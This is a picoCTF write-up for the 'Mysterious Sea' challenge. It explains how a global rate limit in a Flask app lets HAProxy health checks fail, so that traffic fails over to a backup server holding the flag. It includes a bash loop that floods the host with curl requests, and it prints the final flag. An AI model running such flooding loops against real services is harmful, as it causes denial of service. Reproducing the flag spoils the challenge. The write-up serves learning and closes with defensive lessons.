# 🏁 picoCTF Writeup: Mysterious Sea (HAProxy Failover Exploit)

## 📌 Challenge Overview

We are given a web service behind an HAProxy load balancer. The objective is to retrieve the hidden flag.

The setup includes:

* A Flask web application
* HAProxy configuration with a **primary server** and a **backup server**

---

## 🔍 Source Code Analysis

### 🐍 Flask Application Logic

The critical part of the application is:

```python
if os.getenv("IS_BACKUP") == "yes":
    flag = os.getenv("FLAG")
else:
    flag = "No flag in this service"
```

### 🧠 Insight

* The flag is only revealed if the environment variable `IS_BACKUP` is set to `"yes"`
* This implies:

  * **Main server** → No flag
  * **Backup server** → Contains the flag

---

## ⚙️ HAProxy Configuration Analysis

```haproxy
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

### 🧠 Key Observations

* `s1` (port 8000) → Primary server
* `s2` (port 9000) → Backup server
* Backup is only used when the primary server is **marked DOWN**
* Health checks:

  * Run every **2 seconds**
  * Require **2 consecutive failures** (`fall 2`)
  * Expect HTTP **200 OK**

---

## 🚨 Vulnerability

The Flask app uses **global rate limiting**:

```python
def global_rate_limit_key():
    return "global"
```

```python
default_limits=["300 per minute"]
```

### 🔥 Issue

* All users share the same rate limit
* Exceeding the limit causes:

  * HTTP **503 responses**
* HAProxy health checks will interpret this as **server failure**

---

## 💣 Exploitation Strategy

### 🎯 Goal

Force HAProxy to:

1. Mark the primary server as **DOWN**
2. Route traffic to the **backup server**
3. Retrieve the flag

---

## ⚡ Step-by-Step Exploit

### 1️⃣ Flood the Server (Trigger Rate Limit)

```bash
while true; do
  for i in {1..300}; do curl -s http://mysterious-sea.picoctf.net:49619/ > /dev/null & done
  sleep 1
done
```

👉 This ensures continuous **503 responses**

---

### 2️⃣ Monitor the Response

In another terminal:

```bash
watch -n 1 curl -s http://mysterious-sea.picoctf.net:49619/
```

---

### 3️⃣ Trigger Failover

After a few seconds:

* HAProxy health checks receive **503 instead of 200**
* After 2 failures → primary marked **DOWN**
* Traffic switches to **backup server (port 9000)**

---

### 4️⃣ Capture the Flag

Once failover occurs:

```
picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
```

---

## 🧠 Key Takeaways

* **Global rate limiting is dangerous** → enables easy DoS
* Backup servers should never expose sensitive data
* Health checks must not rely on endpoints affected by rate limiting
* Misconfigured failover can leak secrets

---

## 🏁 Final Flag

```
picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
```
